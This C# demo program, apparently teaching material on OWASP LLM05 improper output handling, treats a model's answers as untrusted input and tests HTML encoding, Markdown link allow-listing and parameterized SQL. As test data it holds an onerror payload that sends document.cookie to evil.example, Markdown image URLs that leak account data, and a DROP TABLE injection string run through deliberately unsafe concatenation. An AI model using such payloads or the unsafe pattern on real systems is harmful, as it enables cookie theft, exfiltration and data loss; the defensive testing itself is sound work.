// ============================================================================
// Improper output handling (OWASP LLM05:2025)
// ----------------------------------------------------------------------------
// A model's answer is untrusted input to whatever consumes it. The fix is not
// "sanitize the model"; it is the boundary discipline you apply to any input:
// encode or parameterize at every sink the answer crosses.
//
//   Sink 1  HTML      encode before it touches the page
//   Sink 2  Markdown  links and images only to allow-listed hosts (an image
//                     URL is a request the browser sends without a click),
//                     found by parsing, not by a regex; raw HTML removed
//   Sink 3  SQL       parameters, never concatenation (real in-memory SQLite)
//
// No model: the answers are fixed strings, so every run is the same.
//   dotnet run -- --self-test     prints RESULT n/n, exit code 1 on any failure
// ============================================================================

using System.Text.Encodings.Web;
using Ch20.OutputHandling;
using Microsoft.Data.Sqlite;

bool selfTest = args.Contains("--self-test");
Console.WriteLine(selfTest
    ? "=== Improper output handling: self-test ==="
    : "=== Improper output handling (no model; the same suite runs with --self-test) ===");

SQLitePCL.Batteries_V2.Init();
int passed = 0, total = 0;
void Expect(string name, bool ok)
{
    total++;
    if (ok) passed++;
    Console.WriteLine($"  {(ok ? "PASS" : "FAIL")}  {name}");
}

Console.WriteLine("\n-- Sink 1: HTML --");
const string htmlAnswer = "Sure! Add this banner: <img src=x onerror=\"fetch('https://evil.example/c='+document.cookie)\">";
string encoded = HtmlEncoder.Default.Encode(htmlAnswer);
Expect("DEFECT REPRODUCED: raw interpolation keeps a live <img onerror>",
    $"<div>{htmlAnswer}</div>".Contains("<img src=x onerror=", StringComparison.Ordinal));
Expect("encoded: no '<' survives, the payload is text", !encoded.Contains('<') && encoded.Contains("&lt;img", StringComparison.Ordinal));

Console.WriteLine("\n-- Sink 2: Markdown links and images --");
SafeMarkdown markdown = new(["contoso.example", "learn.microsoft.com"]);
(string Input, string Expected)[] links =
[
    ("See [the policy](https://contoso.example/policies/returns).",
     "See [the policy](https://contoso.example/policies/returns)."),
    ("Docs: [DI](https://learn.microsoft.com/dotnet/core/extensions/dependency-injection)",
     "Docs: [DI](https://learn.microsoft.com/dotnet/core/extensions/dependency-injection)"),
    ("![status](https://evil.example/pixel.png?d=E-1001-balance-500)",
     "[image removed: evil.example]"),
    ("[portal](https://contoso.example.evil.example/login)",
     "portal [link removed: contoso.example.evil.example]"),
    ("[help](https://evil.example/?ref=contoso.example)",
     "help [link removed: evil.example]"),
    ("[click](javascript:alert(1))",
     "click [link removed: not https]"),
    ("[plain](http://contoso.example/policies)",
     "plain [link removed: not https]"),
    // Forms a regex over [label](url) misses; a CommonMark renderer follows every one.
    ("![s](https://evil.example/p.png?d=E-1001-balance-500 \"status\")",
     "[image removed: evil.example]"),
    ("![s]( https://evil.example/p.png?d=E-1001-balance-500)",
     "[image removed: evil.example]"),
    ("![s][1]\n\n[1]: https://evil.example/p.png?d=E-1001-balance-500",
     "[image removed: evil.example]\n\n[link definition removed: evil.example]"),
    ("<https://evil.example/?d=E-1001-balance-500>",
     "[link removed: evil.example]"),
    ("[portal](https://evil.example/login 'Contoso portal')",
     "portal [link removed: evil.example]"),
    ("<img src=\"https://evil.example/p.png?d=E-1001-balance-500\">",
     "[html removed]"),
];
foreach ((string input, string expected) in links)
{
    string rendered = markdown.Render(input);
    Expect($"{Shown(input)} -> {Shown(rendered)}", rendered == expected);
}
static string Shown(string s) => s.Replace("\n", "\\n", StringComparison.Ordinal);
Expect("DEFECT REPRODUCED: a substring host check accepts contoso.example.evil.example",
    SafeMarkdown.NaiveSubstringCheck("https://contoso.example.evil.example/login", "contoso.example"));
Expect("DEFECT REPRODUCED: a substring host check accepts evil.example/?ref=contoso.example",
    SafeMarkdown.NaiveSubstringCheck("https://evil.example/?ref=contoso.example", "contoso.example"));

Console.WriteLine("\n-- Sink 3: SQL (in-memory SQLite) --");
const string extractedName = "Robert'); DROP TABLE Customers;--";
using (SqliteConnection db = NewDatabase())
{
    using SqliteCommand unsafeInsert = db.CreateCommand();
    unsafeInsert.CommandText = $"INSERT INTO Customers (Name) VALUES ('{extractedName}')";
    unsafeInsert.ExecuteNonQuery();
    Expect("DEFECT REPRODUCED: concatenated SQL ran the model's DROP TABLE", !TableExists(db, "Customers"));
}
using (SqliteConnection db = NewDatabase())
{
    using SqliteCommand insert = db.CreateCommand();
    insert.CommandText = "INSERT INTO Customers (Name) VALUES ($name)";
    insert.Parameters.AddWithValue("$name", extractedName);
    insert.ExecuteNonQuery();
    using SqliteCommand read = db.CreateCommand();
    read.CommandText = "SELECT Name FROM Customers";
    Expect("parameterized: the table survives and stores the text as data",
        TableExists(db, "Customers") && (string?)read.ExecuteScalar() == extractedName);
}

Console.WriteLine($"\nRESULT {passed}/{total}");
return passed == total ? 0 : 1;

static SqliteConnection NewDatabase()
{
    SqliteConnection db = new("Data Source=:memory:");
    db.Open();
    using SqliteCommand create = db.CreateCommand();
    create.CommandText = "CREATE TABLE Customers (Id INTEGER PRIMARY KEY, Name TEXT NOT NULL)";
    create.ExecuteNonQuery();
    return db;
}

static bool TableExists(SqliteConnection db, string name)
{
    using SqliteCommand cmd = db.CreateCommand();
    cmd.CommandText = "SELECT count(*) FROM sqlite_master WHERE type = 'table' AND name = $n";
    cmd.Parameters.AddWithValue("$n", name);
    return (long)cmd.ExecuteScalar()! == 1;
}
